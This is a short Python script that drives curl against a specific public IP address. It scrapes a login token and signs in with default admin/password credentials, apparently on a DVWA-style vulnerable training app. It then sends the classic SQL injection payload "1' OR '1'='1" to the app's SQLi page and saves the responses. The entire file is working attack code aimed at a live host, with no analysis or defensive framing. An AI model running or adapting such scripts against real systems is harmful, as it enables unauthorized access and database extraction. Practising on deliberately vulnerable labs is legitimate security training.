
import subprocess
import re

# Step 1: Get login page and extract token
cmd = [
    'curl',
    '-s',
    '-c', '/tmp/cookies.txt',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", result.stdout)
token = token_match.group(1) if token_match else None
print(f"[*] Token: {token}")

# Step 2: Login
cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-c', '/tmp/cookies.txt',
    '-d', f'username=admin&password=password&user_token={token}&Login=Login',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
print("[*] Logged in")

# Step 3: Test with POST method on the SQL injection page
test_ids = ["1", "1' OR '1'='1"]

for test_id in test_ids:
    print(f"\n[*] Testing: {test_id}")
    
    cmd = [
        'curl',
        '-s',
        '-b', '/tmp/cookies.txt',
        '-d', f'id={test_id}&Submit=Submit',
        'http://31.97.117.123/vulnerabilities/sqli/'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    
    # Look for pre section
    if '<pre>' in result.stdout:
        start = result.stdout.find('<pre>')
        end = result.stdout.find('</pre>', start) + 6
        section = result.stdout[start:end]
        print(f"[+] Found results:")
        print(section)
        
        # Save to file for analysis
        with open(f'/tmp/sqli_test_{test_id.replace(" ", "_")}.html', 'w') as f:
            f.write(result.stdout)
    else:
        print(f"[-] No pre section found")
        # Save for debugging
        with open(f'/tmp/sqli_post_{test_id.replace(" ", "_")}.html', 'w') as f:
            f.write(result.stdout)
        print(f"[*] Saved to /tmp/sqli_post_{test_id.replace(' ', '_')}.html")

